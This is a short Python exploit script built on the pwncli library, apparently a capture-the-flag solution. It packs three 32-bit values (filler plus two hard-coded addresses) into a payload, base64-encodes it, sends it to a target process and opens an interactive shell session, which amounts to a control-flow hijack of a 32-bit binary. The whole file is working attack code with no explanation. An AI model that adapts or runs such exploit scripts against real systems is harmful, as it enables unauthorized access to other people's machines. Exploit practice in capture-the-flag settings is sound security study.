from pwncli import *

cli_script()

p:tube = gift['io']

payload = p32(0xdeadbeef) + p32(0x804925f) + p32(0x811eb40)

p.sendline(b64e(payload))

p.interactive()